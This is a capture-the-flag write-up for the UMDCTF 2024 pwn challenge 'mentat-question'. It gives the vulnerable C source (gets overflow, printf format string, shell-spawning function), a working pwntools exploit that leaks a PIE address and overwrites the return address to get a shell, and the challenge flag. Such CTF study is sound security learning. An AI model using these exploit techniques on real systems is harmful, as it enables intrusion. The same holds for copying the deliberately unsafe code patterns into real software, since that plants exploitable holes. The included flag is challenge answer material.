---
title: mentat-question
date: 2024-04-28T23:58:34+03:00
description: Writeup for mentat-question [UMDCTF_2024]
author: sunbather
tags:
- pwn
draft: false
---
___

## Challenge Description

Thufir Hawat is ready to answer any and all questions you have. Unless it's not about division...

## Intuition

For this challenge, we receive the source code. I will be attaching it below, in a code box. We can notice multiple interesting things:
1. We have a _win_ function (``secret``).
2. We have a buffer overflow when ``gets(buf)`` is called in ``calculate``.
3. We have a format string vulnerability when ``printf(buf)`` is called in ``calculate``.
4. Binary has PIE enabled.

The idea is to get to the vulnerabilities, so it's a game of bypassing checks. Firstly, we somehow have to get to ``num2 < 1``, but also bypass ``strncmp(buf, "0", 1) == 0`` in main. We see ``num2`` is unsigned, which means we can only bypass the first condition by assigning it the value 0. However, we can't pass 0 as the input, because of the condition in main, that won't allow us to enter ``calculate`` in the first place. So then, the next idea is to give a really high number as input, so the buffer won't be ``"0"``, but after it's converted and assigned, num2 will overflow to 0. Then we can use the vulnerabilities we noticed above.

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>

void secret() {
    system("/bin/sh");
}

uint32_t calculate(uint32_t num1, uint32_t num2) {
    printf("%i\n", num1);
    printf("%i\n", num2);

    char buf[16];

    if (num2 < 1) {
        puts("Oh, I was not aware we were using negative numbers!");
        puts("Would you like to try again?");
        gets(buf);
        if (strncmp(buf, "Yes", 3) == 0) {
            fputs("Was that a ", stdout);
            printf(buf);
            fputs(" I heard?\n", stdout);
            return 0;
        } else {
            puts("I understand. Apologies, young master.");
            exit(0);
        }
    }

    return num1 / num2;
}

int main() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    uint32_t num1;
    uint32_t num2;
    uint32_t res = 0;

    char buf[11];
    puts("Hello young master. What would you like today?");
    fgets(buf, sizeof(buf), stdin);

    if (strncmp(buf, "Division", 8) == 0) {
        puts("Of course");
        while (res == 0) {
            puts("Which numbers would you like divided?");
            fgets(buf, sizeof(buf), stdin);
            num1 = atoi(buf);

            fgets(buf, sizeof(buf), stdin);
            getc(stdin);
            if (strncmp(buf, "0", 1) == 0) {
                puts("I'm afraid I cannot divide by zero, young master.");
                return 1;
            } else {
                num2 = atoi(buf);
            }

            res = calculate(num1, num2);
        }
    }

    return 0;
}
```

## Solution

We use the plan above to get to the vulns. Then we leak ``main`` function's address to find the PIE ASLR slide and then we get to ``calculate`` again to use the buffer overflow. We overwrite the return address with ``secret`` and that's it. You can find the script below with explanations:

```py
#!/usr/bin/env python3

from pwn import *

# okay I did a cool trick here lol
# I added +1 to skip the push rbp because system crashes on stack misalignment
# You can also do this by returning to simple ``ret`` gadget, to align again
# But I was too lazy to run ROPGadget on this challenge.
# In fact, I didn't even import in Ghidra, I used objdump and gdb only.
# I got this offset by doing main - secret in gdb
secret_offset_from_main = - 306 + 1 

#target = process("./mentat-question")
target = remote("challs.umdctf.io", 32300)

target.sendlineafter(b"Hello young master. What would you like today?", b"Division")
target.recvuntil(b"Which numbers would you like divided?")
target.sendline(b"1")
target.sendline(b"4294967296") # max value of uint32_t that overflows to 0

# leak 25$p, found through trial and error and gdb
# you can also calculate it but usually it's not trivial
target.sendlineafter(b"Would you like to try again?", b"Yes %25$p")
print(target.recvline())
main_leak = int(target.recvline().split()[-3], 16)

# calculate absolute address
secret_addr = main_leak + secret_offset_from_main

payload = b"a" * 0x15 + p64(secret_addr)

target.recvuntil(b"Which numbers would you like divided?")
target.sendline(b"1")
target.sendline(b"4294967296")

# do the thing
target.sendlineafter(b"Would you like to try again?", b"Yes" + payload)

# this is the part where my mentat starts having an epileptic seizure
# do they ever do that in the books?
target.interactive()
```

### Flag

``UMDCTF{3_6u1ld_n4v16470r5_4_7074l_0f_1.46_m1ll10n_62_50l4r15_r0und_7r1p}``
